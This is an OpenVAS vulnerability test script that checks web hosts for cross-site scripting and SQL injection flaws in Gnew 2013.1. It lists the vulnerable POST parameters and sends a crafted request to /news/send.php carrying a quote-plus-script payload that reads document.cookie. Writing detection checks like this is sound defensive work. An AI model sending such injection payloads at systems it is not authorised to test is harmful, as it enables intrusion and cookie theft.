###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_gnew_mult_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# Gnew Multiple Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804110");
  script_version("$Revision: 11401 $");
  script_cve_id("CVE-2013-5639", "CVE-2013-5640", "CVE-2013-7349", "CVE-2013-7368");
  script_bugtraq_id(62817, 62818);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-10-17 14:49:54 +0530 (Thu, 17 Oct 2013)");
  script_name("Gnew Multiple Vulnerabilities");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary HTML
  script code in a user's browser session in the context of an affected site,
  and inject or manipulate SQL queries in the back-end database, allowing
  for the manipulation or disclosure of arbitrary data.");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP POST request and check whether it
  is able to read cookie or not.");
  script_tag(name:"insight", value:"Multiple flaws in Gnew exists due to,

  - Insufficient filtration of 'friend_email' HTTP POST parameter passed to
  /news/send.php and  users/password.php scripts, 'user_email' HTTP POST
  parameter passed to /users/register.php script, 'news_id' HTTP POST parameter
  passed to news/send.php script, 'thread_id' HTTP POST parameter passed to
  posts/edit.php script, 'story_id' HTTP POST parameter passed to
  comments/index.php script, 'answer_id' and 'question_id' HTTP POST parameters
  passed to polls/vote.php script, 'category_id' HTTP POST parameter passed to
  news/submit.php script, 'post_subject' and 'thread_id' HTTP POST parameters
  passed to posts/edit.php script.

  - Insufficient validation of user-supplied input passed via the 'gnew_language'
  cookie to /users/login.php script.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Gnew and is prone to multiple vulnerabilities");
  script_tag(name:"affected", value:"Gnew version 2013.1, Other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://secunia.com/advisories/54466");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Oct/7");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/28684");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/123482");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

gnPort = get_http_port(default:80);

if(!can_host_php(port:gnPort)){
  exit(0);
}

host = http_host_name(port:gnPort);

foreach dir (make_list_unique("/", "/gnew", "/cms", cgi_dirs(port:gnPort)))
{

  if(dir == "/") dir = "";

  if(http_vuln_check(port:gnPort, url: dir + "/news/index.php",
                     check_header: TRUE, pattern:">Gnew<"))
  {
    postdata = "send=1&user_name=username&user_email=a%40b.com&friend_email=c@d.com&news_id=-1'" +
               "<script>alert(document.cookie);</script>";

    url = dir + "/news/send.php";
    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n\r\n",
                  postdata);

    res = http_keepalive_send_recv(port:gnPort, data:req);

    if(res =~ "HTTP/1\.. 200" && "<script>alert(document.cookie);</script>" >< res)
    {
      report = report_vuln_url( port:gnPort, url:url );
      security_message(port:gnPort, data:report);
      exit(0);
    }
  }
}

exit(99);
